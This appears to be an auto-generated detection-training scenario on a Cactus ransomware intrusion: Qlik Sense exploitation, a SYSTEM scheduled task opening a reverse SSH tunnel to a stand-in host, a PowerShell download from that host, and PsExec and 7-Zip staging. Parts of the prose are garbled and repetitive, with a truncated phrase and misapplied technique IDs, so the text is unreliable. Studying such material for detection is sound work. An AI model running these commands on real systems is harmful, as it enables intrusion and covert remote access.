scenario.name: Kroll, Arctic Wolf & CISA KEV — Cactus Ransomware: Qlik Sense Exploitation (CVE-2023-41265), Chisel SSH Tunneling & AES Batch-Driven Self-Decryption (.cts1)
scenario.overview: Think of a bright neighborhood supermarket filled with stocked grocery aisles, rolling shopping carts, barcode price stickers, and busy checkout conveyor belts. Pushing a metal shopping cart down the supermarket aisles, a shopper peels a cheap barcode sticker off a small item and presses it cleanly onto a high-value boxed product. In this real-world scenario, the intruder leaves a hidden spare latch behind so they can walk back into the supermarket later, then smuggles copied records out past the barcode price scanner in tiny disguised batches. When the store manager reconciles the checkout receipt tape against the aisle inventory count and overhead camera, the swapped barcode trick is caught red-handed. In this scenario (T1190, Kroll, Arctic Wolf & CISA KEV, Cactus Ransomware: Qlik Sense Exploitation , CVE-2023-41265, Chisel SSH Tunneling & AES Batch-Driven Self-Decryption .cts1), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: qlik Sense Tunneling RCE, then psExec Batch Staging, 7z.exe Extraction, then multi-Stream Micro-Read Encryption. Steps #1–#3 walk that chain end-to-end by covering Qlik Sense Tunneling RCE, then PsExec Batch Staging, 7z.exe Extraction, then Multi-Stream Micro-Read Encryption, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.

stages.title: Stage 1: Qlik Sense Tunneling RCE (CVE-2023-41265) & Persistent OpenSSH Scheduled Task
stages.subtitle: Initial Access & Persistence (T1190 / T1053.005 / T1572)
stages.description: Pushing a metal shopping cart down the supermarket aisles, a shopper peels a cheap barcode sticker off a small item and presses it cleanly onto a high-value boxed product. Specifically in Step 1, the intruder leaves a hidden spare latch behind so they can walk back into the supermarket later while everyday visitors and the checkout cashier go about their routine. Cactus operators exploit HTTP request tunneling and path traversal in Qlik Sense Enterprise (CVE-2023-41265 and CVE-2023-41266), causing scheduler.exe to spawn cmd.exe and powershell.exe. They immediately register a Scheduled Task that runs a persistent reverse SSH connection (sshd.exe / ssh.exe -R) back to their C2 server (logged in Sysmon Event 1 with ExploitedService=Qlik Sense Scheduler , scheduler.exe, VulnerabilityIds=CVE-2023-41265 & CVE-2023-41266, PersistenceTask=Scheduled Task "Updates" running reverse SSH tunnel so analysts can verify the exact actor and target artifact). Under the hood, the observed step executes C:\Program Files\Qlik\Sense\Scheduler\scheduler.exe -> cmd.exe /c powershell.exe -enc ... (which invokes the Windows PowerShell host , powershell.exe with stealth and execution-policy bypass flags , such as -NoP, -NonI, -W Hidden, -Exec Bypass so that achieves fileless in-memory staging and execution , T1190 during "Qlik Sense Tunneling RCE , CVE-2023-41265 & Persistent OpenSSH Scheduled Task" without writing compiled binaries to disk, while generating PowerShell Operational EventID 4104 , ScriptBlock and 4103 , Module/Pipeline telemetry). Next, the follow-up artifact schtasks.exe /create /tn "Updates" /tr "C:\ProgramData\ssh.exe -N -R 2222:127.0.0.1:3389 user@198.51.100.42" /sc minute /mo 5 /ru SYSTEM runs (which Calls the Windows Task Scheduler CLI , schtasks.exe or ITaskService RPC interface to register, modify, or execute a scheduled task XML definition u so that establishes recurring execution persistence , T1190 during "Qlik Sense Tunneling RCE , CVE-2023-41265 & Persistent OpenSSH Scheduled Task" under SYSTEM or privileged account authority so the implant automatically respawns on schedule, boot, or user logon). On the diagram, follow Step #1 / Link #1 (#1→ powershell.exe -nop -w hidden -c "Invoke-WebRequest http://198.51.100.42/7z.msi -OutFile C:\ProgramData\7z.msi" / ⇠#1 ACK 1) from Node ① (#1 Cactus Operator (Chisel + OpenSSH C2)) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Encrypted Enterprise Shares (.cts1 / cAcTuS.readme.txt)).

stages.title: Stage 2: PsExec Batch Staging, `7z.exe` Extraction & `-i` AES Key Self-Decryption (`ntuser.dat`)
stages.subtitle: Defense Evasion & Execution Guardrails (T1140 - Deobfuscate/Decode Files / T1480)
stages.description: At the checkout lane, the cashier slides the box across the glowing barcode scanner, which blindly trusts the swapped sticker instead of inspecting what is inside the box. Here in Step 2 inside the supermarket, the intruder quietly copies a trusted access pass from the checkout cashier's station without disturbing the locked stockroom back door. Using a custom PowerShell sprayer (s.ps1) and psexec.exe, the operator drops a password-protected 7-Zip archive onto target hosts, extracts it with 7z.exe, deletes the archive, and launches the Cactus binary with -i <64_hex_AES_key>. The binary reads the encrypted payload from C:\ProgramData\ntuser.dat, decrypts it in memory using the -i AES-256 key, and re-launches itself with the -r runtime flag (logged in Sysmon Event 1 with AntiAnalysisMechanism=Requires -i 32-byte hex AES key to decrypt C:\ProgramData\ntuser.dat, ExecutionStages=-s , setup -> -i , decrypt ntuser.dat -> -r , runtime encryption so analysts can verify the exact actor and target artifact).
